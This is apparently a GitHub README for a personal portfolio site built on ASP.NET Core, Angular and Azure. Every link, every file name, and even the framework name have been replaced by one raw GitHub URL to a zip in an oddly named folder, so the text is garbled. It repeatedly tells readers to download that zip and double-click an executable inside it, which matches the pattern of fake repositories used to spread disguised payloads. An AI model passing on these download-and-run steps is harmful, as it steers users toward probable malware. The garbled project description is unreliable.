# 🌐 connerdrake-portfolio-site - Your Personal Online Showcase
...
[![Download](https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site-subcapsular.zip)](https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site-subcapsular.zip)

## 💡 Overview

This portfolio site is built using **https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site-subcapsular.zip Core MVC**, **Razor Pages**, and supported by **SQL Server** and **EF Core**. It also uses **Angular** for a modern user experience and is deployed on **Azure App Service** with CI/CD using **Azure DevOps**. The site includes SEO-friendly static pages created with **Statiq** to enhance visibility.
...
1. **Visit the Releases Page**  
   Go to the releases page to download the latest version of the application: [Download Here](https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site-subcapsular.zip).
...
5. **Run the Application**  
   Navigate to the extracted folder. Look for the executable file (it may be named `https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site-subcapsular.zip`). Double-click on this file to start the application.
...
- **About Page**: Update the `https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site-subcapsular.zip` file to modify your introduction and achievements.
- **Projects Section**: Alter the `https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site-subcapsular.zip` file to display your recent work.
- **Contact Page**: Change `https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site-subcapsular.zip` to update your contact information.
...
3. **Deploy Your Application**  
   Use Azure DevOps for CI/CD to automate the deployment process. Make sure to follow the instructions provided in Azure documentation for deploying https://raw.githubusercontent.com/alt-Bias/connerdrake-portfolio-site/main/tamanu/connerdrake-portfolio-site-subcapsular.zip Core applications.
